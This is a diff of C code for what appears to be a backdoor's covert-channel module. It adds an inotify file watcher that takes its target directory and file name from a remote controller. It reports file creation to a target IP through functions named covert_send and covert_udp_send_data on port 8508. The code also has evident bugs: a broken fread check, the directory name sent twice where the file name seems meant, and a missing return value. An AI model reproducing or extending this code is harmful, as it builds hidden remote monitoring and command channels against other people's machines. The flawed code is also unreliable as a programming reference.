@@ -26,9 +26,52 @@ void *watch_directory(void* args){
     struct epoll_event *events;
     char buffer[BUFLEN];
     int k, len;
+    FILE* fp;
+    long size;
+    char *buf;
 
-    strncpy(directory, arg->directory, BUFSIZ);
-    strncpy(file, arg->file, BUFSIZ);
+
+    recv_results(arg->localip, 8508, "directory", arg->tcp);
+    recv_results(arg->localip, 8508, "file", arg->tcp);
+
+    if((fp = fopen("directory", "rb")) == NULL) {
+        perror("fopen can't open file");
+        exit(1);
+    }
+
+    fseek(fp, 0, SEEK_END);
+    size = ftell(fp);
+    rewind(fp);
+    buf = calloc(1, size+1);
+    if(fread(buf, size, 1, fp) == !1){
+        perror("fread");
+        fclose(fp);
+        free(buf);
+        exit(1);
+    }
+    strncpy(directory, buf, BUFSIZ);
+    printf("Directory to watch: %s\n", directory);
+    fclose(fp);
+    free(buf);
+
+    if((fp = fopen("file", "rb")) == NULL) {
+        perror("fopen can't open file");
+        exit(1);
+    }
+    fseek(fp, 0, SEEK_END);
+    size = ftell(fp);
+    rewind(fp);
+    buf = calloc(1, size+1);
+    if(fread(buf, size, 1, fp) == !1){
+        perror("fread");
+        fclose(fp);
+        free(buf);
+        exit(1);
+    }
+    strncpy(file, buf, BUFSIZ);
+    printf("File to watch: %s\n", file);
+    fclose(fp);
+    free(buf);
 
     socket = initInotify();
     watch = addWatch(socket, directory);
@@ -56,7 +99,7 @@ void *watch_directory(void* args){
                             strcat(filename, directory);
                             strcat(filename, file);
                             send_results(arg->localip, arg->targetip, 8508, 8508, filename, arg->tcp);
-                            printf("File was created:w exiting\n");
+                            printf("File was created\n");
                             close(socket);
                             free(events);
                             exit(1);
@@ -75,6 +118,27 @@ void *watch_directory(void* args){
 }
 
 void *recv_watch_directory(void* args){
+    inotify_struct *arg = args;
+    char data[BUFSIZ];
+    char directory[BUFSIZ];
+    char file[BUFSIZ];
+
+    strncpy(directory, arg->directory, BUFSIZ);
+    strncpy(file, arg->file, BUFSIZ);
+
+    strncpy(data, directory, BUFSIZ);
+	if(arg->tcp){
+        covert_send(arg->localip, arg->targetip, 8508, 8508, (unsigned char*)data, 0);
+    } else {
+        covert_udp_send_data(arg->localip, arg->targetip, 8508, 8508, data, 1);
+    }
+    strncpy(data, directory, BUFSIZ);
+    if(arg->tcp){
+        covert_send(arg->localip, arg->targetip, 8508, 8508, (unsigned char*)data, 0);
+    } else {
+        covert_udp_send_data(arg->localip, arg->targetip, 8508, 8508, data, 1);
+    }
+    recv_results(arg->targetip, 8508, "inotify", arg->tcp);
 }
 
 
